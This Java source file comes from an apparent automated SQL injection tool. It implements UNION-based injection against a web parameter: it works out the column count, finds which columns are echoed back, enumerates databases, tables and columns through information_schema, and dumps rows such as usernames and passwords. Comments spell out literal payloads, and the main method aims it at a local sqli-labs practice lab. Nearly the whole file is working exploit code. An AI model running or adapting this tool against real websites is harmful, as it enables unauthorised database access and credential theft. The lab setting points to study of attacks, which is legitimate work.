package com.sqldd.payloadOrigin;

import com.sqldd.crawler.HtmlDownloader;
import com.sqldd.crawler.MyRequestSet;
import com.sqldd.fuzzingWaf.PageComparison;
import com.sqldd.p0jo.InjectableDomain;
import com.sqldd.payloadOrigin.utils.HeuristicUtils;
import com.sqldd.payloadOrigin.utils.Tools;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Stack;

public class UnionQueryPayloads {
    /**
     * select xxx from xxx where xx = 1 union select
     * 　　联合注入通常是有一定的步骤：
     * 　　　　1. 判断注入点
     * 　　　　2. 判断注入类型（数字型型or字符型）
     * 　　　　3. 判断字段数
     * 　　　　4. 判断回显位
     * 　　　　5. 确定数据库名
     * 　　　　6. 确定表名
     * 　　　　7. 确定字段名
     * 　　　　8. 拿到数据
     */
    private String url;
    private String method;
    private String pre;
    private String preWrong;
    private String suf;
    private String sufbk;
    private HashMap<String,String> params = new HashMap<String,String>();//参数
    private String injectingKey;//正在测试的注入点
    private HashMap<String,String> normalparams1 = new HashMap<String,String>();//参数
    private HashMap<String,String> normalparams2 = new HashMap<String,String>();//参数
    private HtmlDownloader htmlDownloader = new HtmlDownloader(new MyRequestSet());
    HeuristicUtils heuristicUtils = new HeuristicUtils();


    public UnionQueryPayloads(String url,String method,String pre,String preWrong,String suf,String sufbk,HashMap<String,String> params,String injectingKey,HashMap<String,String> normalparams1,HashMap<String,String> normalparams2){
        this.url = url;
        this.method = method;
        this.pre = pre;
        this.preWrong = preWrong;
        this.suf = suf;
        this.sufbk =sufbk;
        this.params = params;
        this.injectingKey = injectingKey;
        this.normalparams1 = normalparams1;
        this.normalparams2 = normalparams2;
    }

    //公共部分提取出来，避免重复调用浪费时间
    public ArrayList<String> getNormalRst(){
        //正常页面
        System.out.println("获取正常页面值");
        PageComparison pageComparison = new PageComparison(this.url,this.method);
        ArrayList<String> normalRst = pageComparison.getNormalPageComparison(normalparams1,normalparams2);
        return normalRst;
    }

    //判断注入点

    //判断注入类型
    //数字型就是无需闭合符号的注入
    //字符型就是需要闭合符号的注入
    //这里我们测试test1，已知为字符型且闭合符号为'

    //判断字段数
    //方案一：注释符可用： 1' order by 1--+
    //方案二：注释符不可用:1' union select 1+'0 // 1' union select 1,2+'0//...一位位添加，直到rate==1
    public int getColNum(){
        PageComparison pageComparison = new PageComparison(this.url,this.method);
        ArrayList<String> normalRst = getNormalRst();
        int colNum = 0;
        //预设最长22
        String boundary = "order by ";
        String payloadM = heuristicUtils.heuristicDetection(url, method,params , injectingKey, normalparams1, normalparams2,"", boundary, "");
        for (int i = 22; i > 0; i--) {
            String payload = pre + payloadM + " "+i + suf;
            this.params.put(this.injectingKey, payload);
            int rate = pageComparison.getRate(normalRst, this.params);
            if(rate == 1)
                return i;
        }
        if(colNum == 0){
            String boundary2 = "union select ";
            String payloadM2 = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1, normalparams2,"", boundary2, "");
            String payload = "";
            for (int i = 1; i <= 22; i++) {
                if(i == 1){
                    payload = pre + payloadM2 + i + "+"+sufbk+"0";
                }else{
                    String mid = "";
                    for (int j = 1; j < i; j++) {
                         mid += j + ",";
                    }
                    payload = pre + payloadM2 + mid + i + "+"+sufbk+"0";
                }
                params.put(injectingKey, payload);
                int rate = pageComparison.getRate(normalRst, params);
                if(rate == 1)
                    return i;
            }
        }
        System.out.println("colNum:" + colNum);
        return colNum;
    }

    //初步判断是否可union注入
    public boolean ifCouldBeInjected(){
        PageComparison pageComparison = new PageComparison(this.url,this.method);
        ArrayList<String> normalRst = getNormalRst();
        int colNum = getColNum();
        String payload = "union select 1";
        for (int i = 2; i <= colNum; i++) {
           payload += "," + i;
        }
        payload += suf;
        String payload1 = "union select ";
        for (int i = 1; i < colNum; i++) {
            payload1 += i + ",";
        }
        payload1 += sufbk + colNum;
        String payloadM = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1, normalparams2,preWrong, payload, "");
        String payloadM1 = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1, normalparams2,preWrong, payload1, "");
        params.put(injectingKey, payloadM);
        int rate = pageComparison.getRate(normalRst, params);
        params.put(injectingKey, payloadM1);
        int rate1 = pageComparison.getRate(normalRst, params);
        if(rate == 1 || rate1==1)
            return true;
        return false;
    }

    //判断显示位
    //方案一，注释符可用：  -1' union select concat(~,1,~),concat(~,2,~),concat(~,3,~)--+
    //方案二，注释符不可用：-1' union select concat(~,1,~),concat(~,2,~),3+'123332111
    //另一种思路就是 'vv',2,3,/1,'vv',3/1,2,'vv'依次判断是否是显示位
    public ArrayList<Integer> getDisplayPlaces(int colNum){
        Tools tools = new Tools();
        PageComparison pageComparison = new PageComparison(this.url,this.method);
        ArrayList<Integer> displayPlaces = new ArrayList<Integer>();
        ArrayList<String> normalRst = getNormalRst();

        String boundary  = "union select ";
        for (int i = 1; i < colNum; i++) {
            boundary += tools.tools_concat(""+i) + ",";
        }
        //通过判断suf是否长度为0或者为null，来选择方案
        if(suf.length() == 0){
            boundary += ""+colNum+"+"+sufbk+"12332111";
        }else
            boundary += tools.tools_concat(""+colNum);
        String payload = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, preWrong, boundary, suf);

        this.params.put(this.injectingKey, payload);
        int rate = pageComparison.getRate(normalRst, this.params);
        if(rate == 1){
            String html = "";
            if(method.equals("get"))
                html = htmlDownloader.downloadHtmlWithParamsGet(url, params);
            else if(method.equals("post"))
                html = htmlDownloader.downloadHtmlWithParamsPost(url, params);
            ArrayList<String> rst = tools.tools_returnClosureRst(html);
            if(rst == null)
                return null;
            for (String s : rst) {
                displayPlaces.add(Integer.parseInt(s));
            }
        }else
            return null;
        return displayPlaces;
    }

    //拿到所有的数据库名
    //方案一，注释符可用： -1' union select 1,group_concat(0x7e,schema_name,0x7e),3 from information_schema.schemata --+
    //方案二，注释符不可用：-1' union select 1,group_concat(0x7e,schema_name,0x7e),3 from information_schema.schemata where '1
    //方案三，注释符不可用：-1' union select 1,group_concat(0x7e,schema_name,0x7e),3 from information_schema.schemata order by '1
   public ArrayList<String> getAllDatabase(int colNum, ArrayList<Integer> displayPlaces){
       Tools tools = new Tools();
       ArrayList<String> databases = new ArrayList<String>();
       ArrayList<String> normalRst = getNormalRst();
       PageComparison pageComparison = new PageComparison(this.url,this.method);

       //构造payload-START
       String boundary = "union select ";
       int flag = 0;
       for (int i = 1; i < colNum; i++) {
           if(displayPlaces.contains(i) && flag == 0){
               boundary += tools.tools_group_concat("schema_name")+",";
               flag = 1;
           }
           else
               boundary += i + ",";
       }
       if(displayPlaces.contains(colNum) && flag == 0)
           boundary += tools.tools_group_concat("schema_name");
       else
           boundary += colNum;
       boundary += " from information_schema.schemata";
       String payload = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, "", boundary, "");//payload借助启发式函数构造
       payload = preWrong + payload + suf + sufbk;
       //构造payload-END

       ArrayList<String> strings = new ArrayList<String>() {
           {
               add(suf);
               add(" where "+sufbk+1);
               add(" order by "+sufbk + 1);
           }
       };
       for (String string : strings) {
           payload = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, preWrong, boundary, string);//payload借助启发式函数构造
           params.put(injectingKey, payload);
           int rate = pageComparison.getRate(normalRst, params);
           if(rate == 1){
               String html = "";
               if(method.equals("get"))
                   html = htmlDownloader.downloadHtmlWithParamsGet(url, params);
               else if(method.equals("post"))
                   html = htmlDownloader.downloadHtmlWithParamsPost(url, params);
               ArrayList<String> rst = tools.tools_returnClosureRst(html);
               if(rst == null)
                   return null;
               databases.addAll(rst);
               break;
           }
       }
       return databases;
   }

    //确定当前数据库名
    //方案一，注释符可用：  -1' union select 1,group_concat(0x7e,database(),0x7e),3--+
    //方案二，注释符不可用：-1' union select 1,group_concat(0x7e,database(),0x7e),'3
    //方案三，注释符不可用，且最后一位是显示位：-1' union select 1,2,group_concat(0x7e,database(),0x7e) order by '1
    public String getDatabase(int colNum,ArrayList<Integer> displayPlaces){
        Tools tools = new Tools();
        PageComparison pageComparison = new PageComparison(this.url,this.method);
        ArrayList<String> normalRst = getNormalRst();
        //构造payload-START
        String boundary = "union select ";
        int flag = 0;
        for (int i = 1; i < colNum; i++) {
            if(displayPlaces.contains(i) && flag==0){
                boundary += tools.tools_concat("database()") + ",";
                flag = 1;
            }
            else
                boundary += i + ",";
        }
        if(suf.length() == 0 && flag == 1){
            boundary += sufbk + colNum;
        }else if(displayPlaces.contains(colNum) && flag == 0)
            boundary += tools.tools_concat("database()") + " order by "+sufbk + "1";
        else
            boundary += colNum;
        String payload = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, preWrong, boundary, suf);
        //构造payload-END

        params.put(this.injectingKey, payload);
        int rate = pageComparison.getRate(normalRst, params);
        if(rate==1){
            String html = "";
            if(method.equals("get"))
                html = htmlDownloader.downloadHtmlWithParamsGet(url, params);
            else if(method.equals("post"))
                html = htmlDownloader.downloadHtmlWithParamsPost(url, params);
            ArrayList<String> rst = tools.tools_returnClosureRst(html);
            if(rst == null)
                return null;
            return rst.get(0);
        } else
            return null;
    }

    //确定表名
    //-1' union select 1,group_concat(0x7e,table_name,0x7e),3 from information_schema.tables where table_schema='security'--+
    public ArrayList<String> getTableName(int colNum,ArrayList<Integer> displayPlaces,String dbName){
        PageComparison pageComparison = new PageComparison(this.url,this.method);
        Tools tools = new Tools();
        ArrayList<String> normalRst = getNormalRst();

        //payload-start
        String boundary = "union select ";
        int flag = 0;
        for (int i = 1; i < colNum; i++) {
            if(displayPlaces.contains(i) && flag == 0){
                boundary += tools.tools_group_concat("table_name")+",";
                flag = 1;
            }
            else
                boundary += i + ",";
        }
        if(displayPlaces.contains(colNum) && flag == 0)
            boundary += tools.tools_group_concat("table_name");
        else
            boundary += colNum;
        if(suf.length() == 0){
            boundary += " from information_schema.tables where table_schema=" +sufbk+ dbName;
        }else
            boundary += " from information_schema.tables where table_schema='" + dbName + "'";
        String payload = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, preWrong, boundary, suf);
        //payload-end

        params.put(injectingKey, payload);
        int rate = pageComparison.getRate(normalRst, params);
        if(rate == 1 || rate == 2){
            String html = "";
            if(method.equals("get"))
                html = htmlDownloader.downloadHtmlWithParamsGet(url, params);
            else if(method.equals("post"))
                html = htmlDownloader.downloadHtmlWithParamsPost(url, params);
            ArrayList<String> rst = tools.tools_returnClosureRst(html);
            if(rst != null){
                System.out.println("[FOUND]");
                return rst;
            }
            else
                return null;
        }else
            return null;
    }

    //确定字段名
    //方案一，注释符可用： -1'union select 1,group_concat(0x7e,column_name,0x7e),3 from information_schema.columns where table_schema='security' and table_name='users'--+
    //方案三，注释符不可用：-1'union select 1,group_concat(0x7e,column_name,0x7e),3 from information_schema.columns where table_schema='security' and table_name='users
    public ArrayList<String> getColumnName(int colNum, ArrayList<Integer> displayPlaces,String dbName, String tableName){
        Tools tools = new Tools();
        ArrayList<String> normalRst = getNormalRst();
        PageComparison pageComparison = new PageComparison(url,method);
        //payload-start
        String boundary = "union select ";
        int flag = 0;
        for (int i = 1; i < colNum; i++) {
            if(displayPlaces.contains(i) && flag == 0){
                boundary += tools.tools_group_concat("column_name")+",";
                flag = 1;
            }
            else
                boundary += i + ",";
        }
        if(displayPlaces.contains(colNum) && flag == 0)
            boundary += tools.tools_group_concat("column_name");
        else
            boundary += colNum;
        boundary = boundary+ " from information_schema.columns where table_schema='"+dbName+"' and table_name='" + tableName;
        if(suf.length() != 0)
            boundary += "'";
        String payload = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, "", boundary, "");
        payload = preWrong + payload + suf;
        params.put(injectingKey, payload);
        int rate = pageComparison.getRate(normalRst, params);
        if(rate == 1){
            String html = "";
            if(method.equals("get"))
                html = htmlDownloader.downloadHtmlWithParamsGet(url, params);
            else if(method.equals("post"))
                html = htmlDownloader.downloadHtmlWithParamsPost(url, params);
            ArrayList<String> rst = tools.tools_returnClosureRst(html);
            if(rst == null)
                return null;
            return rst;
        }
        return null;
        //payload-end
    }

    //拿到数据
    //group_concat可以取出某列所有数据，但是各字段数据之间没有联系。
    //有效的方法是，先取出某字段（唯一键）的数据，再以此数据作为where条件一条条取。
    //需要补充一点的是：存在显示位小于字段的情况，所有要显示的数据，需要我们手动赋予
    public HashMap<String, ArrayList<String>> getData(int colNum, ArrayList<Integer> displayPlaces, String dbName,String tableName, String uniqueKey, Stack<String> dataUneed){
        Tools tools = new Tools();
        ArrayList<String> normalRst = getNormalRst();
        PageComparison pageComparison = new PageComparison(url,method);

        //payload1：-1' union select 1,group_concat(0x7e,id,0x7e),3 from security.users--+     其中id是uniqueKey
        //注释符不可用：-1' union select 1,group_concat(0x7e,id,0x7e),3 from security.users where '1
        String boundary = "union select ";
        int flag1= 0;
        for (int i = 1; i < colNum; i++) {
            if(displayPlaces.contains(i) && flag1 == 0){
                boundary += tools.tools_group_concat(uniqueKey) + ",";
                flag1= 1;
            }
            else
                boundary += i + ",";
        }
        if(displayPlaces.contains(colNum) && flag1 == 0)
            boundary += tools.tools_group_concat(uniqueKey);
        else
            boundary += colNum;
        boundary += " from "+dbName+"."+tableName;
        ArrayList<String> strings = new ArrayList<String>(){
            {
                add(" "+suf);
                add(" where "+sufbk + "1");
            }
        };
        ArrayList<String> uniqueKeyRsts = new ArrayList<>();
        boolean find  = false;
        for (String string : strings) {
            System.out.println("[suf_type]"+string);
            String payload1 = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, preWrong, boundary+string, "");
            //payload1~end
            params.put(injectingKey, payload1);
            int rate = pageComparison.getRate(normalRst, params);
            if(rate == 1){
                String html = "";
                if(method.equals("get"))
                    html = htmlDownloader.downloadHtmlWithParamsGet(url, params);
                else if(method.equals("post"))
                    html = htmlDownloader.downloadHtmlWithParamsPost(url, params);
                ArrayList<String> uniqueKeyRstsTMP = tools.tools_returnClosureRst(html);
                if(uniqueKeyRstsTMP != null) {
                    System.out.println("[FOUND]:关键字集合:" + uniqueKeyRstsTMP.toString());
                    uniqueKeyRsts.addAll(uniqueKeyRstsTMP);
                    find = true;
                    break;
                }
            }
        }
        if(find == false)
            return null;
        //payload2：-1' union select 1,group_concat(0x7e,username,0x7e),group_concat(0x7e,password,0x7e) from security.users where id='1'--+   其中username和password是dataUneed,1是我们遍历上一个payload的结果
        String boundary2 = "union select ";
        for (int i = 1; i < colNum; i++) {
            if(displayPlaces.contains(i) && !dataUneed.empty()){
                boundary2 += tools.tools_group_concat(dataUneed.pop()) + ",";
            }
            else
                boundary2 += i + ",";
        }
        if(displayPlaces.contains(colNum) && !dataUneed.empty())
            boundary2 += tools.tools_group_concat(dataUneed.pop());
        else
            boundary2 += colNum;
        if(suf.length() == 0){
            boundary2 += " from " + dbName+"."+tableName + " where " + uniqueKey + "=" + sufbk;
        }else
            boundary2 += " from " + dbName+"."+tableName + " where " + uniqueKey + "='";
        String payload2 = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, "", boundary2, "");
        //最终结果放到hashmap里:如"1":{"dump","dump"}
        HashMap<String,ArrayList<String>> dataUneedRst = new HashMap<>();
        for (String id : uniqueKeyRsts) {
            String payloaddataUneedTmp = preWrong + payload2;
            if(suf.length() == 0){
                payloaddataUneedTmp += id;
            }else
                payloaddataUneedTmp += id + "'" + suf;
            params.put(injectingKey, payloaddataUneedTmp);
            int rate1 = pageComparison.getRate(normalRst, params);
            if(rate1 == 1){
                String htmlx = "";
                if(method.equals("get"))
                    htmlx = htmlDownloader.downloadHtmlWithParamsGet(url, params);
                else if(method.equals("post"))
                    htmlx = htmlDownloader.downloadHtmlWithParamsPost(url, params);
                ArrayList<String> rst = tools.tools_returnClosureRst(htmlx);
                if(rst == null)
                    return null;
                System.out.println("[FOUND]:"+id+":"+rst.toString());
                dataUneedRst.put(id, rst);
            }
        }

        return dataUneedRst;
    }

    //综合-获取所有库的数据
    public HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> getAllDBsDatas(){
        HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> dbs = new HashMap<>();//存储库
        int colNum = getColNum();
        if(colNum != 0){
            System.out.println("[进程success]：获取有效字段数量:["+colNum+"]");
            ArrayList<Integer> displayPlaces = getDisplayPlaces(colNum);
            if(displayPlaces != null){
                System.out.print("[进程success]：获取显示位:[");
                for (Integer displayPlace : displayPlaces) {
                    System.out.print(displayPlace+" ");
                }
                System.out.print("]\n");
                ArrayList<String> allDatabases = getAllDatabase(colNum,displayPlaces);
                if(allDatabases !=null){
                    System.out.print("[进程success]：获取所有数据库:[");
                    for (String dbName : allDatabases) {
                        System.out.print(dbName+" ");
                    }
                    System.out.print("]\n");
                    for (String dbName : allDatabases) {
                        HashMap<String, ArrayList<ArrayList<String>>> tbs = new HashMap<>();//存储表
                        ArrayList<String> tables = getTableName(colNum, displayPlaces, dbName);
                        if(tables != null){
                            System.out.print("[进程success]：获取数据库["+dbName+"]的表:[");
                            for (String table : tables) {
                                System.out.print(table+" ");
                            }
                            System.out.print("]\n");
                            for (String table : tables) {
                                ArrayList<ArrayList<String>> tb_datas = new ArrayList<>();
                                ArrayList<String> columnNames = getColumnName(colNum, displayPlaces, dbName, table);
                                if(columnNames != null){
                                    ArrayList<String> col_name = new ArrayList<>();//存储列名
                                    System.out.print("[进程success]：获取数据库["+dbName+"]的表["+table+"]的列:[");
                                    for (String columnName : columnNames) {
                                        System.out.print(columnName+" ");
                                        col_name.add(columnName);
                                    }
                                    System.out.print("]\n");
                                    Stack<String> dataUneed = new Stack<>();
                                    for (int i = 0; i < displayPlaces.size(); i++) {
                                        if(i+1 != columnNames.size())
                                            dataUneed.push(columnNames.get(i+1));
                                    }
                                    HashMap<String, ArrayList<String>> datas = getData(colNum, displayPlaces, dbName,table, columnNames.get(0), dataUneed);
                                    if(datas != null){
                                        System.out.println("[进程success]：获取数据库["+dbName+"]的表["+table+"]的列的值");
                                        for (String key : datas.keySet()) {
                                            ArrayList<String> col_data = new ArrayList<>();//存储列数据
                                            if(datas.get(key) == null)
                                                continue;
                                            System.out.print(key + " ");
                                            col_data.add(key);
                                            for (String value : datas.get(key)) {
                                                col_data.add(value);
                                                System.out.print(value + " ");
                                            }
                                            System.out.println("");
                                            tb_datas.add(col_data);
                                        }
                                        System.out.println("\n");
                                    }else
                                        System.out.println("[进程fail]：获取数据库["+dbName+"]的表["+table+"]的列的值");
                                }else
                                    System.out.println("[进程fail]：获取数据库["+dbName+"]的表["+table+"]的列");
                            }
                        }else
                            System.out.println("[进程fail]：获取数据库["+dbName+"]的表");
                        dbs.put(dbName, tbs);
                    }
                }else
                    System.out.println("[进程fail]：获取所有数据库");
            }else
                System.out.println("[进程fail]：获取显示位");
        }
        else
            System.out.println("[进程fail]：获取有效字段数量");

        return dbs;
    }

    //综合-获取当前库的数据
    public HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> getCurrentDBsDatas(){
        HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> dbs = new HashMap<>();//存储库
        /**
         *  security:{users{id,username,password},...}
         */
        int colNum = getColNum();
        if(colNum != 0){
            System.out.println("[进程success]：获取有效字段数量:["+colNum+"]");
            ArrayList<Integer> displayPlaces = getDisplayPlaces(colNum);
            if(displayPlaces != null){
                System.out.print("[进程success]：获取显示位:[");
                for (Integer displayPlace : displayPlaces) {
                    System.out.print(displayPlace+" ");
                }
                System.out.print("]\n");
                String currentDB = getDatabase(colNum,displayPlaces);
                if(currentDB !=null){
                    HashMap<String, ArrayList<ArrayList<String>>> tbs = new HashMap<>();//存储表
                    System.out.println("[进程success]：获取当前数据库:["+currentDB + "]");
                    ArrayList<String> tables = getTableName(colNum, displayPlaces, currentDB);
                    if(tables != null){
                        System.out.print("[进程success]：获取数据库["+currentDB+"]的表:[");
                        for (String table : tables) {
                            System.out.print(table+" ");
                        }
                        System.out.print("]\n");
                        for (String table : tables) {
                            ArrayList<ArrayList<String>> tb_datas = new ArrayList<>();
                            ArrayList<String> columnNames = getColumnName(colNum, displayPlaces, currentDB, table);
                            if(columnNames != null){
                                ArrayList<String> col_name = new ArrayList<>();//存储列名
                                System.out.print("[进程success]：获取数据库["+currentDB+"]的表["+table+"]的列:[");
                                for (String columnName : columnNames) {
                                    System.out.print(columnName+" ");
                                    col_name.add(columnName);
                                }
                                tb_datas.add(col_name);
                                System.out.print("]\n");
                                Stack<String> dataUneed = new Stack<>();
                                for (int i = 0; i < displayPlaces.size(); i++) {
                                    if(i+1 != columnNames.size())
                                        dataUneed.push(columnNames.get(i+1));
                                }
                                HashMap<String, ArrayList<String>> datas = getData(colNum, displayPlaces, currentDB,table, columnNames.get(0), dataUneed);
                                if(datas != null){
                                    System.out.println("[进程success]：获取数据库["+currentDB+"]的表["+table+"]的列的值");
                                    for (String key : datas.keySet()) {
                                        ArrayList<String> col_data = new ArrayList<>();//存储列数据
                                        if(datas.get(key) == null)
                                            continue;
                                        System.out.print(key + " ");
                                        col_data.add(key);
                                        for (String value : datas.get(key)) {
                                            col_data.add(value);
                                            System.out.print(value + " ");
                                        }
                                        System.out.println("");
                                        tb_datas.add(col_data);
                                    }
                                    System.out.println("\n");
                                }else
                                    System.out.println("[进程fail]：获取数据库["+currentDB+"]的表["+table+"]的列的值");
                            }else
                                System.out.println("[进程fail]：获取数据库["+currentDB+"]的表["+table+"]的列");
                            tbs.put(table, tb_datas);
                        }
                    }else
                        System.out.println("[进程fail]：获取数据库["+currentDB+"]的表");
                    dbs.put(currentDB, tbs);
                }else
                    System.out.println("[进程fail]：获取所有数据库");
            }else
                System.out.println("[进程fail]：获取显示位");
        }
        else
            System.out.println("[进程fail]：获取有效字段数量");

        return dbs;
    }

    public static void main(String[] args) {
        /*HashMap<String, String> params = new HashMap<>();
        params.put("id", "any");
        String [] normalvalue = {"1","2"};
        UnionQueryPayloads test = new UnionQueryPayloads("http://localhost/sqli-labs/Less-1/", "get","1'", "-1'","-- ","", params, "id", normalvalue);
        HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> allDBsDatas = test.getAllDBsDatas();*/

        String url = "http://localhost/sqli-labs/Less-12/";
        String method = "post";
        HashMap<String, String> params = new HashMap<>();
        params.put("uname", "admin");
        params.put("passwd", "admin");
        params.put("submit", "Submit");
        String injectingKey ="uname";
        HashMap<String, String> normalparams1 = new HashMap<String,String>(){
            {
                put("uname", "admin");
                put("passwd", "admin");
                put("submit", "Submit");
            }
        };
        HashMap<String, String> normalparams2 = new HashMap<String,String>(){
            {
                put("uname", "admin1");
                put("passwd", "admin1");
                put("submit", "Submit");
            }
        };
        String pre = "admin\")";
        String preWrong = "xx\")";
        String suf = "-- ";
        String sufbk = "(\"";

        UnionQueryPayloads test = new UnionQueryPayloads(url, method, pre, preWrong, suf, sufbk, params, injectingKey, normalparams1,normalparams2);
        /*int colNum = test.getColNum();
        System.out.println("colNum:"+colNum);
        ArrayList<Integer> displayPlaces = test.getDisplayPlaces(colNum);
        for (Integer place : displayPlaces) {
            System.out.println("dispaly-bit:"+place);
        }*/
        ArrayList<Integer> displayPlaces = new ArrayList<Integer>() {{
            add(1);
            add(2);
        }};
        /*String database = test.getDatabase(2, displayPlaces);
        System.out.println("database:"+database);*/

        /*ArrayList<String> dbs = test.getAllDatabase(2, displayPlaces);
        for (String db : dbs) {
            System.out.println(db);
        }*/

        /*ArrayList<String> tables = test.getTableName(2, displayPlaces, "security");
        for (String table : tables) {
            System.out.println(table);
        }*/

        /*ArrayList<String> cols = test.getColumnName(2, displayPlaces, "security", "users");
        for (String col : cols) {
            System.out.println(col);
        }*/

        Stack<String> stack = new Stack<String>() {{
            push("username");
            push("password");
        }};

        /*int colNum = test.getColNum();
        System.out.println("colNum"+colNum);
        ArrayList<Integer> places = test.getDisplayPlaces(colNum);
        System.out.println("places"+places.toString());
        String database = test.getDatabase(colNum, displayPlaces);
        System.out.println("database" + database);*/
        /*HashMap<String, ArrayList<String>> datas = test.getData(2, displayPlaces, "security", "users", "id", stack);
        for (String key : datas.keySet()) {
            System.out.println(key + ":" + datas.get(key).toString());
        }

        HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> allDBsDatas = test.getAllDBsDatas();
        for (String db : allDBsDatas.keySet()) {
            System.out.println("数据库:" + db);
            for (String tb : allDBsDatas.get(db).keySet()) {
                System.out.println("表:" + tb);
                for (ArrayList<String> columnANDdatas : allDBsDatas.get(db).get(tb)) {
                    for (String ddata : columnANDdatas) {
                        System.out.println(ddata);
                    }
                }
            }
        }*/

/*        boolean ifCouldBeInjected = test.ifCouldBeInjected();
        System.out.println(ifCouldBeInjected);*/

        HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> currentDBsDatas = test.getCurrentDBsDatas();
        for (String curDB : currentDBsDatas.keySet()) {
            System.out.println("\n\n库:"+curDB);
            for (String db : currentDBsDatas.get(curDB).keySet()) {
                System.out.println("表:" + db);
                ArrayList<ArrayList<String>> colPerDB = currentDBsDatas.get(curDB).get(db);
                for (ArrayList<String> datas : colPerDB) {
                    for (String data : datas) {
                        System.out.print(data + "__");
                    }
                    System.out.println("");
                }
            }
        }
    }
}